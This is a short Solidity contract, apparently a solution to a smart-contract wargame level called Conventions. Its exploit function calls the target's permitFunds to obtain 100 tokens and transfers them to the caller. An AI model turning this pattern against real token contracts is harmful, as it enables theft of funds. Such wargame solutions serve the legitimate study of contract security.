// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import '../levels/Conventions.sol';

contract ConventionsAttack {
    uint256 value = 100 * 10**18;

  function exploit(address target) public {
    Conventions conventions = Conventions(target);
    require(conventions.permitFunds(value), "Failed to obtain tokens."); // obtain 100 tokens
    require(conventions.transfer(msg.sender, value), "Failed to transfer tokens.");
  }
}